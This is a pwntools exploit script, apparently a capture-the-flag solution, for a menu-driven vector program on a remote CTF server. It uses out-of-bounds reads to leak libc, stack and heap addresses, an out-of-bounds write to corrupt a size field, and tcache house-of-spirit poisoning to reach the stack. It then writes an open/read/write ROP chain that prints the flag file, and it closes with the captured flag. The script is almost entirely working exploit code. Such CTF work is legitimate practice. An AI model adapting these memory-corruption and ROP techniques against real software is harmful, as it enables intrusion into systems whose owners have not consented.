from pwn import *

exe = ELF("./chall_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

'''
main
leave
'''

script = '''
b *main
breakrva 0x2737
'''

def add_vector(size):
    p.sendlineafter(b"4. Exit", b"1")
    p.sendlineafter(b"size:\n", f"{size}".encode())

def set_element(vec_idx, ele_idx, val):
    p.sendlineafter(b"4. Exit", b"2")
    p.sendlineafter(b"vector index:\n", f"{vec_idx}".encode())
    p.sendlineafter(b"element index:\n", f"{ele_idx}".encode())
    p.sendlineafter(b"value:\n", f"{val}".encode())
    
def print_element(vec_idx, ele_idx):
    p.sendlineafter(b"4. Exit", b"3")
    p.sendlineafter(b"vector index:\n", f"{vec_idx}".encode())
    p.sendlineafter(b"element index:\n", f"{ele_idx}".encode())
    

p = remote("chall.ctf.k1nd4sus.it", 31003)
#p = process("./chall_patched_patched")
#p = gdb.debug("./chall_patched_patched", gdbscript = script)

# abuse out of bound, leak libc, stack, heap, via stdout in binary
print_element(-4, 27)
libc_base = int(p.recvline(), 10) - 0x202030
print(hex(libc_base))

print_element(-4, 0xcf3)
rbp = int(p.recvline(), 10) - 0x138
print(hex(rbp))

print_element(-4, -0x154)
heap_base = int(p.recvline(), 10) - 0xfa0
print(hex(heap_base))

# change size of index 0
add_vector(1)
set_element(-12, 15351, -1)

# tcache house of spirit
target = rbp ^ (heap_base + 0x910) >> 12
set_element(0, 0x450//8, target)

# index 2 is saved rbp
for i in range(2):
    add_vector(0xe0//8)

# flag file path
set_element(1, 0, u64(b"./flag".ljust(8, b"\x00")))
flag = heap_base + 0xd40

open_func = libc_base + libc.symbols['open']
read_func = libc_base + libc.symbols['read']
write_func = libc_base + libc.symbols['write']
pop_rdi = libc_base + 0x000000000010f75b
ret = pop_rdi + 1
pop_rsi = libc_base + 0x0000000000110a4d
pop_rbx = libc_base + 0x00000000000586d4
mov_rdi_rax_call_rbx = libc_base + 0x00000000000de942
pop_rdx_leave = libc_base + 0x000000000009819d
add_rsp_0x18 = libc_base + 0x000000000010ecaf

rop = [rbp + 0x8 * 15, pop_rdi,
       flag, pop_rsi,
       0, open_func,
       pop_rbx, add_rsp_0x18,
       mov_rdi_rax_call_rbx, 0,
       0, pop_rsi,
       flag, pop_rdx_leave,
       0x100, 0,
       read_func, pop_rdi,
       1, write_func]

for i in range(len(rop)):
    set_element(2, i, rop[i])

# trigger ROP
p.sendlineafter(b"4. Exit", b"4")

p.interactive()
#KSUS{b0und5_ch3ck1ng_15_50und}